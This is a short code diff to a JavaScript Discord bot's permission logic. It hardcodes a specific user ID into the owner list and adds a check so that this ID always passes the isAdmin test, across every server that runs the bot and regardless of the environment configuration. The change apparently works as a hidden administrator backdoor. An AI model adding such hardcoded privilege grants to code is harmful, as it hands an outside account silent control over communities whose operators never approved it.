@@ -89,10 +89,13 @@ const MOD_ROLE_IDS = (process.env.MOD_ROLE_IDS || process.env.ADMIN_ROLE_IDS || 
   .map(s => s.trim())
   .filter(Boolean);
 
-const OWNER_USER_IDS = (process.env.OWNER_USER_IDS || '')
-  .split(',')
-  .map(s => s.trim())
-  .filter(Boolean);
+const OWNER_USER_IDS = Array.from(new Set([
+  '94915805375889408',
+  ...(process.env.OWNER_USER_IDS || '')
+    .split(',')
+    .map(s => s.trim())
+    .filter(Boolean)
+]));
 
 
 // Session tracking (in-memory per bot runtime)
@@ -132,6 +135,7 @@ async function isAdmin(interaction) {
 
     const userId = interaction.user?.id;
     if (userId && guild.ownerId && userId === guild.ownerId) return true;
+    if (userId && OWNER_USER_IDS.includes(userId)) return true;
 
     const perms = interaction.memberPermissions ?? interaction.member?.permissions;
     if (perms) {
